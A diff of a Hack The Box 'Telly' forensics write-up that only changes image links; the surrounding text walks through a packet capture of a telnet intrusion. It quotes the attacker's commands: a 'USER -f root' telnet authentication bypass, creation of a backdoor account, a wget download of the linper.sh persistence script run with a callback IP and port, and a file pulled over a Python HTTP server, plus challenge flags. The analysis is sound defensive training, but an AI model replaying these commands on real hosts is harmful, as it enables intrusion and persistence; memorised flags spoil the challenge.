@@ -1,6 +1,6 @@
 # Telly 
 
-<img width="100" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/tlogo.png" />
+<img width="100" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/tlogo.png" />
 
 ## SOC - Very Easy
 
@@ -11,7 +11,7 @@
 - We download the required `.zip` containg a single `.pcap` file:
   - `monitoringservice_export_202610AM-11AM.pcapng`
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t1.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t1.png" />
 
 ***
 
@@ -36,7 +36,7 @@
 
 From the packet we selected, we can right click and `Follow > TCP Stream` where we notice the line:
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t2.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t2.png" />
 
 ```
 . .38400,38400....#.kali:0.0....'..USER.-f root.DISPLAY.kali:0.0......XTERM-256COLOR..
@@ -66,7 +66,7 @@ CVE-2026-24061
 
 - Another question associated with the same packet, we scroll down and see the hostname once the user gets access, `root@backup-secondary`.
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t3.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t3.png" />
 
 - **Flag for task:**
 ```
@@ -80,7 +80,7 @@ backup-secondary
 - Scrolling down again in the same packet reveals the commands the user input once they gained root access.
 - From here we can see the line:
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t4.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t4.png" />
 
 ```
 sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[201~
@@ -99,7 +99,7 @@ cleanupsvc:YouKnowWhoiam69
 
 - We continue scrolling down as we can see the entire session and all the commands the attacker entered.
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t5.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t5.png" />
 
 ```
 wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
@@ -143,7 +143,7 @@ wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linp
 root@backup-secondary: /tmp.root@backup-secondary:/tmp# bash linper.sh --enum-defenses -i 91.99.25.54 -p 5599 --stealth-mode
 ```
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t6.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t6.png" />
 
 >[!NOTE]
 > This command executes the `linper.sh` script in defense enumeration mode (`--enum-defenses`), which checks the system for Tripwire file integrity policies that could detect unauthorized changes to common persistence locations (e.g., cron, systemd, bashrc). Although the attacker supplied an IP (`-i 91.99.25.54`), port (`-p 5599`), and the `--stealth-mode` flag, these are ignored because the script exits immediately after the enumeration function completes—before any persistence installation or stealth modifications occur. The inclusion of these unused parameters suggests the attacker may have reused a command template or is preparing for a subsequent, full-featured run. Overall, this activity represents reconnaissance: the attacker is probing whether the compromised host employs file integrity monitoring, a key step in deciding how to deploy persistent backdoors without detection.
@@ -172,7 +172,7 @@ python3 -m http-server 6932
 
 Once the server is hosted and running, we can see the user then extracting the file from the server:
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t7.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t7.png" />
 
 ```
 Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
@@ -184,7 +184,7 @@ Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
 
 - With this, we can click the specific line in the TCP stream and on our Wireshark client, it jumps to that packet and gives us the time, in this case `2026-01-27 10:49:54`.
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t8.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t8.png" />
 
 - **Flag for task:**
 ```
@@ -197,7 +197,7 @@ Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
 
 - From the file extraction we can find, we `Follow > HTTP Stream` and the server response contains the information. Although heavily obfuscated we can see it by changing the **Show as:** field from `ASCII` to `RAW`.
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t9.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/t9.png" />
 
 - The credit card number for Quinn Harris is **5312269047781209**. This value is extracted from the SQLite database found in the HTTP response, where the binary data `00 12 df 7b 05 8b 57 59` corresponds to the integer `0x0012df7b058b5759`, which equals 5,312,269,047,781,209 in decimal.
 
@@ -208,4 +208,4 @@ Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
 
 ***
 
-<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/tclear.png" />
+<img width="250" alt="image" src="https://github.com/kittykrat/crispy-giggle/blob/main/HacktheBox/Sherlocks/Telly/Images/tclear.png" />
